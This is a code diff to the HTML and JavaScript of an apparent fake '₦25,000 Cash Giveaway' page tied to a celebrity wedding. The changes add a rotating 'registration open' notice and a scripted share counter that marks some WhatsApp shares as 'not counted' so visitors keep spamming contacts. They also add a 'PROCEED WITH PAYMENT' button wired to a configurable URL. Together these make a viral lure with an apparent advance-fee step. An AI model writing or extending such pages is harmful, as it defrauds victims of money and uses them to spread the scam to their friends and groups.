@@ -40,7 +40,7 @@
     #fill,#fill2{background:#098105;width:0;height:100%;transition:width .2s linear}
     .percentage{display:flex;align-items:center;justify-content:center;width:95px;float:right;height:35px;font-size:16px;border:2px solid #098105}
     .share-note{padding:12px;background:#f7f7f7;border-radius:4px;margin:10px 0}
-    .claim-actions button{width:100%;margin:10px 0}
+    .claim-actions button{width:100%;margin:0}
     .comments{margin-top:14px;border-top:1px solid #e1e2e3;padding-top:10px;direction:ltr}
     .counter{color:#7f7f7f;font-size:12px;text-align:right;padding:10px 0;border-bottom:1px solid #e1e2e3}
     .reactions{display:inline-flex;align-items:center;float:left}
@@ -59,11 +59,22 @@
     .input{padding:6px 12px 12px}
     .input input{width:100%;background:#f1f2f6;padding:10px;border-radius:15px;border:0;outline:none}
     .status-box{background:#f7f7f7;border:1px solid #ddd;border-radius:4px;padding:12px;margin:12px 0;font-size:13px;line-height:1.65}
+    .top-notice{position:sticky;top:0;z-index:20;display:flex;align-items:center;gap:9px;background:#fff8dd;border-bottom:1px solid #ead98e;padding:10px 12px;color:#5d4a00;font-size:12px;line-height:1.45;box-shadow:0 2px 8px rgba(0,0,0,.08)}
+    .top-notice-dot{width:9px;height:9px;border-radius:50%;background:#098105;flex:0 0 auto;animation:pulse 1.6s infinite}
+    @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.45;transform:scale(.8)}}
+    .share-feedback{display:none;padding:10px 12px;margin:10px 0;border-radius:4px;font-size:13px;line-height:1.55}
+    .share-feedback.fail{display:block;background:#fff1f0;border:1px solid #f1b6b2;color:#a61b12}
+    .share-feedback.ok{display:block;background:#edf9f0;border:1px solid #a9dfb5;color:#146b2d}
+    .claim-actions{display:grid;gap:10px}
     @media(max-width:380px){button{width:100%}}
   </style>
 </head>
 <body>
 <main class="page">
+  <div class="top-notice" role="status" aria-live="polite">
+    <span class="top-notice-dot"></span>
+    <span id="topNoticeText">Campaign registration is currently open.</span>
+  </div>
   <img class="hero" src="image.png" alt="Peller and Jarvis ₦25,000 Cash Giveaway wedding celebration">
   <marquee direction="left">PELLER AND JARVIS WEDDING CELEBRATION CASH GIVEAWAY</marquee>
 
@@ -116,6 +127,7 @@
         <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp by tapping SHARE below.</p>
         <p class="tip">2. Return to this page and continue until the green progress bar is filled.</p>
       </div>
+      <div id="shareFeedback" class="share-feedback" aria-live="polite"></div>
       <button id="whatsapp"><font color="white">SHARE</font></button>
       <div class="barr">
         <div class="fill"><div id="fill2"></div></div>
@@ -130,7 +142,9 @@
         Your ₦25,000 Cash Giveaway registration can now continue. Final eligibility and payment depend on the published campaign terms and review.
       </div>
       <div class="claim-actions">
-        <button id="offer">CONTINUE</button>
+        <button id="continueButton">CONTINUE</button>
+        <button id="paymentButton">PROCEED WITH PAYMENT</button>
+        <button id="statusButton">CHECK REGISTRATION STATUS</button>
       </div>
     </div>
 
@@ -193,8 +207,16 @@
 <script>
 (function(){
   const OFFER_CONFIG = {
-    continueUrl: ""
+    continueUrl: "",
+    paymentUrl: "",
+    statusUrl: ""
   };
+
+  const CAMPAIGN_NOTICES = [
+    "Campaign registration is currently open.",
+    "Your progress is saved automatically on this device.",
+    "Completed registrations move to final eligibility review."
+  ];
   const STORAGE_KEY = "pellerJarvisCashShareProgress";
   const sections = ["intro","loader","info","checking","share","claim"];
   const byId = id => document.getElementById(id);
@@ -276,26 +298,71 @@
     ].join("\n");
   }
 
+  const SHARE_STEPS = [
+    {increment:50, counted:true},
+    {increment:0, counted:false},
+    {increment:15, counted:true},
+    {increment:5, counted:true},
+    {increment:0, counted:false},
+    {increment:10, counted:true},
+    {increment:5, counted:true},
+    {increment:0, counted:false},
+    {increment:5, counted:true},
+    {increment:3, counted:true},
+    {increment:2, counted:true},
+    {increment:2, counted:true},
+    {increment:1, counted:true},
+    {increment:1, counted:true},
+    {increment:1, counted:true}
+  ];
+
+  function setShareFeedback(type, message){
+    const box = byId("shareFeedback");
+    box.className = "share-feedback " + type;
+    box.textContent = message;
+  }
+
   byId("whatsapp").addEventListener("click", () => {
-    const increments = [50,15,5,10,5,2,1,2,1,1,1,1,1,1,2];
     const currentStep = Number(localStorage.getItem(STORAGE_KEY + "Step") || 0);
-    const increment = increments[Math.min(currentStep, increments.length - 1)];
-    shareProgress = Math.min(100, shareProgress + increment);
-    localStorage.setItem(STORAGE_KEY, String(shareProgress));
+    const step = SHARE_STEPS[Math.min(currentStep, SHARE_STEPS.length - 1)];
     localStorage.setItem(STORAGE_KEY + "Step", String(currentStep + 1));
+
+    if (step.counted) {
+      shareProgress = Math.min(100, shareProgress + step.increment);
+      localStorage.setItem(STORAGE_KEY, String(shareProgress));
+      setShareFeedback("ok", "Share activity recorded. Return after WhatsApp opens to continue.");
+    } else {
+      setShareFeedback("fail", "This share attempt was not counted yet. Open WhatsApp, choose another contact or group, then return and try again.");
+    }
     renderShare();
 
     const shareUrl = "https://wa.me/?text=" + encodeURIComponent(buildShareText());
     window.location.href = shareUrl;
   });
 
-  byId("offer").addEventListener("click", () => {
-    if (OFFER_CONFIG.continueUrl) {
-      window.location.href = OFFER_CONFIG.continueUrl;
+  function openConfiguredUrl(url, fallbackMessage){
+    if (url && !url.includes("PASTE_")) {
+      window.location.href = url;
     } else {
-      alert("Your registration has been recorded. The next campaign step will be added here.");
+      alert(fallbackMessage);
     }
+  }
+
+  byId("continueButton").addEventListener("click", () => {
+    openConfiguredUrl(OFFER_CONFIG.continueUrl, "Add your CONTINUE URL inside OFFER_CONFIG.continueUrl.");
   });
+  byId("paymentButton").addEventListener("click", () => {
+    openConfiguredUrl(OFFER_CONFIG.paymentUrl, "Add your payment URL inside OFFER_CONFIG.paymentUrl.");
+  });
+  byId("statusButton").addEventListener("click", () => {
+    openConfiguredUrl(OFFER_CONFIG.statusUrl, "Add your status URL inside OFFER_CONFIG.statusUrl.");
+  });
+
+  let noticeIndex = 0;
+  setInterval(() => {
+    noticeIndex = (noticeIndex + 1) % CAMPAIGN_NOTICES.length;
+    byId("topNoticeText").textContent = CAMPAIGN_NOTICES[noticeIndex];
+  }, 4500);
 
   const savedName = sessionStorage.getItem("pellerJarvisName");
   if (savedName) byId("getname").textContent = savedName;
